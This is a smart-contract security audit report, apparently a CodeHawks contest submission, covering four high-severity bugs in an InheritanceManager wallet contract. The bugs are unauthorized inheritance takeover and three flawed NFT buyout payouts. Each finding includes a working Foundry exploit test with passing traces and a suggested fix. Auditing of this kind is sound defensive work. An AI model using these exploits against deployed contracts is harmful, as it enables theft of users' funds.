## High-1

Unauthorized Inheritance Takeover in InheritanceManager Contract can lead to theft of all contract assets.

## Summary

The `inherit()` function in InheritanceManager allows any address to claim ownership of the contract after 90 days of inactivity, even if they are not registered beneficiaries, leading to potential theft of all contract assets.

## Vulnerability Details

The vulnerability exists in the `inherit()` function where there's no validation to ensure the caller is a registered beneficiary.

Affected code:  

<https://github.com/CodeHawks-Contests/2025-03-inheritable-smart-contract-wallet/blob/9de6350f3b78be35a987e972a1362e26d8d5817d/src/InheritanceManager.sol#L212C3-L229C6>

Attack Path:

* Initial State: Contract has funds and one registered beneficiary

* Step 1: Attacker waits for 90 days of owner inactivity

* Step 2: Attacker calls `inherit()` despite not being a beneficiary

* Step 3: Attacker becomes the new owner and can call `sendETH()`/`sendERC20()`

* Outcome: Attacker drains all contract assets

\
POC : POC test demonstrating the vulnerability:

```Solidity
function test_inheritVulnerabilityByNonBeneficiary() public {
    address attacker = makeAddr("attacker");
    
    vm.startPrank(owner);
    im.addBeneficiery(user1);
    vm.deal(address(im), 10 ether);
    vm.stopPrank();

    vm.warp(block.timestamp + 91 days);

    vm.startPrank(attacker);
    im.inherit();
    im.sendETH(10 ether, attacker);
    vm.stopPrank();

    assertEq(im.getOwner(), attacker);
    assertEq(address(im).balance, 0);
    assertEq(attacker.balance, 10 ether);
}
```

POC Test Outcome : 

```Solidity
Ran 1 test for test/InheritanceManagerTest.t.sol:InheritanceManagerTest
[PASS] test_inheritVulnerabilityByNonBeneficiary() (gas: 127823)
Traces:
  [127823] InheritanceManagerTest::test_inheritVulnerabilityByNonBeneficiary()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [0] VM::deal(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 10000000000000000000 [1e19])
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7862401 [7.862e6])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 
    ├─ [3672] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [35478] InheritanceManager::sendETH(10000000000000000000 [1e19], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   ├─ [0] attacker::fallback{value: 10000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [419] InheritanceManager::getOwner() [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::assertEq(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.07ms (9.29ms CPU time)

```

## Impact

* Complete loss of contract funds (ETH, ERC20 tokens, NFTs)

* Circumvention of intended inheritance mechanism

* Theft of NFTs and other assets

* Loss of trust in the inheritance system

## Tools Used

Manual review and Foundry

## Recommendations

Add beneficiary validation before ownership transfer:

```diff
+ error NotBeneficiary();

function inherit() external {
    if (block.timestamp < getDeadline()) {
        revert InactivityPeriodNotLongEnough();
    }
    
+   // Validate caller is a beneficiary
+   bool isBeneficiary;
+   for (uint256 i = 0; i < beneficiaries.length; i++) {
+       if (beneficiaries[i] == msg.sender) {
+           isBeneficiary = true;
+           break;
+       }
+   }
+   if (!isBeneficiary) revert NotBeneficiary();

    if (beneficiaries.length == 1) {
        owner = msg.sender;
        _setDeadline();
    } else if (beneficiaries.length > 1) {
        isInherited = true;
    } else {
        revert InvalidBeneficiaries();
    }
}
```

-----------------------------------------------------------------------

## High-2

Double Division in Estate NFT Buyout Causes Beneficiary Underpayment

## Summary

The `buyOutEstateNFT` function incorrectly distributes payments by applying division twice, resulting in beneficiaries receiving only half their entitled share during NFT buyouts.

## Vulnerability Details

Affected code:

<https://github.com/CodeHawks-Contests/2025-03-inheritable-smart-contract-wallet/blob/9de6350f3b78be35a987e972a1362e26d8d5817d/src/InheritanceManager.sol#L258C4-L278C1>

\
For a 1000 USDC NFT with 2 beneficiaries:

```Solidity
// First division in finalAmount calculation
finalAmount = (1000 / 2) * 1 = 500 USDC  // Correct payment amount

// Second incorrect division during distribution
distribution = finalAmount / 2 = 250 USDC  // Wrong! Should be 500 USDC
```

The distribution calculation divides the payment amount twice by the number of beneficiaries.

Initial State:

* Two beneficiaries registered

* NFT value: 1000 USDC

* Inheritance activated

Step 1: User2 initiates buyout

* Should pay: 500 USDC (1000/2 \* 1)

* Actually pays: 500 USDC (correct)

Step 2: Distribution occurs

* User1 should receive: 500 USDC

* Actually receives: 250 USDC (500/2) due to second division

POC : 

```Solidity
function test_buyoutDistributionBug() public {
        // Setup two beneficiaries
        address user2 = makeAddr("user2");
        vm.startPrank(owner);
        im.addBeneficiery(user1);
        im.addBeneficiery(user2);
        im.createEstateNFT("valuable estate", 1000e6, address(usdc));
        vm.stopPrank();

        // Enable inheritance
        vm.warp(block.timestamp + 91 days);
        vm.prank(user1);
        im.inherit();

        // Record initial balances
        uint256 contractBalanceBefore = usdc.balanceOf(address(im));
        uint256 user1BalanceBefore = usdc.balanceOf(user1);
        uint256 user2BalanceBefore = usdc.balanceOf(user2);

        // Execute buyout from user2
        usdc.mint(user2, 1000e6);
        vm.startPrank(user2);
        usdc.approve(address(im), 1000e6);
        im.buyOutEstateNFT(1);

        // Verify that:
        // 1. user2 pays 500e6 (half of 1000e6)
        // 2. user1 should receive 250e6 (half of what user2 paid)
        // 3. 250e6 remains in contract
        assertEq(
            usdc.balanceOf(user2), 
            user2BalanceBefore + 1000e6 - 500e6, 
            "User2 paid incorrect amount"
        );
        assertEq(
            usdc.balanceOf(user1) - user1BalanceBefore,
            250e6,  // Should receive half of payment
            "User1 received incorrect distribution"
        );
        assertEq(
            usdc.balanceOf(address(im)) - contractBalanceBefore,
            250e6,  // Half of payment 
            "Incorrect amount in contract"
        );

        vm.stopPrank();
    }
```

POC Result : 

```Solidity
Ran 1 test for test/InheritanceManagerTest.t.sol:InheritanceManagerTest
[PASS] test_buyoutDistributionBug() (gas: 420975)
Traces:
  [420975] InheritanceManagerTest::test_buyoutDistributionBug()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("valuable estate", 1000000000 [1e9], ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("valuable estate")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7862401 [7.862e6])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [2559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2559] ERC20Mock::balanceOf(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [44784] ERC20Mock::mint(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 1000000000 [1e9])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], value: 1000000000 [1e9])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000000 [1e9])
    │   ├─ emit Approval(owner: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000000 [1e9])
    │   └─ ← [Return] true
    ├─ [51920] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [24058] ERC20Mock::transferFrom(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 500000000 [5e8])
    │   │   ├─ emit Transfer(from: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 500000000 [5e8])
    │   │   └─ ← [Return] true
    │   ├─ [23204] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 250000000 [2.5e8])
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 250000000 [2.5e8])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [559] ERC20Mock::balanceOf(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]) [staticcall]
    │   └─ ← [Return] 500000000 [5e8]
    ├─ [0] VM::assertEq(500000000 [5e8], 500000000 [5e8], "User2 paid incorrect amount") [staticcall]
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 250000000 [2.5e8]
    ├─ [0] VM::assertEq(250000000 [2.5e8], 250000000 [2.5e8], "User1 received incorrect distribution") [staticcall]
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 250000000 [2.5e8]
    ├─ [0] VM::assertEq(250000000 [2.5e8], 250000000 [2.5e8], "Incorrect amount in contract") [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.02ms (1.85ms CPU time)
```

## Impact

* In this case beneficiaries receive only half of their entitled share during NFT buyouts causing severe underpayment.

* Violates core business logic of fair asset distribution (breaks invariant 4 in project document)

* Economic loss for beneficiaries in estate settlements

## Tools Used

Manual Review and Foundry

## Recommendations

Fix double division issue in distribution by calculating correct share per beneficiary based on remaining beneficiaries count (in this case : `sharePerBeneficiary`)

```diff
      function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
    uint256 value = nftValue[_nftID];
    uint256 divisor = beneficiaries.length;
    uint256 multiplier = beneficiaries.length - 1;
    uint256 finalAmount = (value / divisor) * multiplier;
    IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
+   uint256 sharePerBeneficiary = finalAmount / (beneficiaries.length - 1);
    for (uint256 i = 0; i < beneficiaries.length; i++) {
        if (msg.sender == beneficiaries[i]) {
            continue;
-           return;
        } else {
-           IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
+           IERC20(assetToPay).safeTransfer(beneficiaries[i], sharePerBeneficiary);
        }
    }
    nft.burnEstate(_nftID);
}
```

-----------------------------------------------------------------------

## High-3

Early Return in BuyoutEstateNFT Causes Complete Payment Distribution Failure

## Summary

When the first beneficiary executes `buyOutEstateNFT`, an early `return` statement prevents any fund distribution to other beneficiaries, despite the contract successfully collecting payment. This creates an immediate financial loss for other beneficiaries making them receives absolutely nothing from their entitled shares from the buy out of the estate nft.

## Vulnerability Details

Affected Code : 

<https://github.com/CodeHawks-Contests/2025-03-inheritable-smart-contract-wallet/blob/9de6350f3b78be35a987e972a1362e26d8d5817d/src/InheritanceManager.sol#L258C4-L278C1>

Root Cause :

```Solidity
for (uint256 i = 0; i < beneficiaries.length; i++) {
    // Hits return immediately in first loop iteration
    // preventing fund distribution for all the remaining beneficiaries
     if (msg.sender == beneficiaries[i]) {
            return;
     } else {
             IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
}
```

For a 1000 USDC NFT with 2 beneficiaries:

1. First beneficiary pays: 500 USDC
2. Loop starts, finds beneficiary at index 0
3. Returns immediately
4. Results:

   * No distribution to second beneficiary

   * Full payment remains in contract

POC :

```Solidity
  function test_firstBeneficiaryBuyoutDistributionFailure() public {
        // Setup
        address user2 = makeAddr("user2");
        vm.startPrank(owner);
        im.addBeneficiery(user1);  // First beneficiary
        im.addBeneficiery(user2);
        im.createEstateNFT("valuable estate", 1000e6, address(usdc));
        vm.stopPrank();

        // Enable inheritance
        vm.warp(block.timestamp + 91 days);
        vm.prank(user1);
        im.inherit();

        // First beneficiary buys out
        usdc.mint(user1, 1000e6);
        vm.startPrank(user1);
        usdc.approve(address(im), 1000e6);
        uint256 user2BalanceBefore = usdc.balanceOf(user2);
        
        im.buyOutEstateNFT(1);

        assertEq(
            usdc.balanceOf(user2),
            user2BalanceBefore,
            "Second beneficiary received no payment"
        );
    }
```

POC Result : 

```Solidity
Ran 1 test for test/InheritanceManagerTest.t.sol:InheritanceManagerTest
[PASS] test_firstBeneficiaryBuyoutDistributionFailure() (gas: 389228)
Traces:
  [389228] InheritanceManagerTest::test_firstBeneficiaryBuyoutDistributionFailure()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("valuable estate", 1000000000 [1e9], ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("valuable estate")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7862401 [7.862e6])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [46784] ERC20Mock::mint(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 1000000000 [1e9])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 1000000000 [1e9])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000000 [1e9])
    │   ├─ emit Approval(owner: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000000 [1e9])
    │   └─ ← [Return] true
    ├─ [2559] ERC20Mock::balanceOf(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [28634] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [26058] ERC20Mock::transferFrom(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 500000000 [5e8])
    │   │   ├─ emit Transfer(from: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 500000000 [5e8])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [559] ERC20Mock::balanceOf(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Second beneficiary received no payment") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.25ms (1.18ms CPU time)
```

## Impact

1. Complete payment loss for other beneficiaries as they receive nothing from the buyout.
2. Breaks estate settlement process
3. Violates project's core purpose: "settle the financial claims fair on-chain"
4. Position in beneficiary array determines ability to exploit

## Tools Used

Manual Review and Foundry

## Recommendations

Use continue instead of return to prevent this : 

```diff
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
    uint256 value = nftValue[_nftID];
    uint256 divisor = beneficiaries.length;
    uint256 multiplier = beneficiaries.length - 1;
    uint256 finalAmount = (value / divisor) * multiplier;
    IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
    
    for (uint256 i = 0; i < beneficiaries.length; i++) {
        if (msg.sender == beneficiaries[i]) {
-           return;
+           continue;
        }
        IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
    }
    nft.burnEstate(_nftID);
}
```

-----------------------------------------------------------------------

## High-4

Double Estate NFT Buyout and Ownership Settlement Vulnerability

## Summary

The `buyOutEstateNFT` function allows multiple buyouts of the same estate NFT due to an early return, preventing NFT burning and proper estate ownership recording.

## Vulnerability Details

Affected Code :

<https://github.com/CodeHawks-Contests/2025-03-inheritable-smart-contract-wallet/blob/9de6350f3b78be35a987e972a1362e26d8d5817d/src/InheritanceManager.sol#L258C4-L278C1>

1. Initial State:

   * NFT ID 1 represents a real estate asset

   * Multiple beneficiaries can claim it

   * No ownership tracking implemented
2. First Buyout:

   * Beneficiary1 calls `buyOutEstateNFT(1)`

   * Pays correct amount

   * Early return prevents NFT burn

   * No ownership record created
3. Second Buyout:

   * Beneficiary2 calls `buyOutEstateNFT(1)` for same NFT

   * Contract accepts second payment

   * No ownership validation occurs
4. Result:

   * Multiple payments collected

   * No clear owner recorded

   * NFT remains active

   * Settlement status unclear

POC :

```Solidity
function test_doubleNFTBuyoutAndOwnership() public {
    // Setup
    address user2 = makeAddr("user2");
    vm.startPrank(owner);
    im.addBeneficiery(user1);
    im.addBeneficiery(user2);
    im.createEstateNFT("valuable estate", 1000e6, address(usdc));
    vm.stopPrank();

    vm.warp(block.timestamp + 91 days);
    vm.prank(user1);
    im.inherit();

    // First buyout
    usdc.mint(user1, 1000e6);
    vm.startPrank(user1);
    usdc.approve(address(im), 1000e6);
    im.buyOutEstateNFT(1);
    vm.stopPrank();

    // Second buyout of same NFT
    usdc.mint(user2, 1000e6);
    vm.startPrank(user2);
    usdc.approve(address(im), 1000e6);
    im.buyOutEstateNFT(1);  // Should fail but succeeds
    vm.stopPrank();
}
```

POC Result : 

```Solidity
Ran 1 test for test/InheritanceManagerTest.t.sol:InheritanceManagerTest
[PASS] test_doubleNFTBuyoutAndOwnership() (gas: 449070)
Traces:
  [449070] InheritanceManagerTest::test_doubleNFTBuyoutAndOwnership()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("valuable estate", 1000000000 [1e9], ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("valuable estate")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7862401 [7.862e6])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [46784] ERC20Mock::mint(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 1000000000 [1e9])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 1000000000 [1e9])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000000 [1e9])
    │   ├─ emit Approval(owner: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000000 [1e9])
    │   └─ ← [Return] true
    ├─ [28634] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [26058] ERC20Mock::transferFrom(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 500000000 [5e8])
    │   │   ├─ emit Transfer(from: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 500000000 [5e8])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [24884] ERC20Mock::mint(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 1000000000 [1e9])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], value: 1000000000 [1e9])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000000 [1e9])
    │   ├─ emit Approval(owner: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000000 [1e9])
    │   └─ ← [Return] true
    ├─ [12120] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [4158] ERC20Mock::transferFrom(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 500000000 [5e8])
    │   │   ├─ emit Transfer(from: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 500000000 [5e8])
    │   │   └─ ← [Return] true
    │   ├─ [3304] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 250000000 [2.5e8])
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 250000000 [2.5e8])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

\
\
Impact
------

1. Multiple payments can be collected for same estate NFT buyout
2. No clear ownership record for estate settlements
3. Breaks core documentation requirement of settling claims on-chain
4. Could lead to legal disputes over asset ownership

## Tools Used

Manual Review and Foundry 

## Recommendations

In `InheritanceManager` contract Add a state variable `estateNftBuyer` mapping and corresponding error at the contract level, just after the existing state variables. Then modify the `buyOutEstateNFT` function to track estate ownership and prevent double buyouts.

```diff
// Add after existing errors
+ error EstateAlreadyBought(uint256 nftId, address buyer);

// Add after existing state variables
+ mapping(uint256 => address) public estateNftBuyer;

// Add after existing events
+ event EstateBought(uint256 indexed estateId, address indexed buyer, uint256 amount);

// Modify buyOutEstateNFT function
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
+   if(estateNftBuyer[_nftID] != address(0)) {
+       revert EstateAlreadyBought(_nftID, estateNftBuyer[_nftID]);
+   }

    uint256 value = nftValue[_nftID];
    uint256 divisor = beneficiaries.length;
    uint256 multiplier = beneficiaries.length - 1;
    uint256 finalAmount = (value / divisor) * multiplier;
    IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
    for (uint256 i = 0; i < beneficiaries.length; i++) {
        if (msg.sender == beneficiaries[i]) {
-           return;
+           continue;
        } else {
            IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
        }
    }

+   estateNftBuyer[_nftID] = msg.sender;
+   emit EstateBought(_nftID, msg.sender, finalAmount);
    nft.burnEstate(_nftID);
}
```
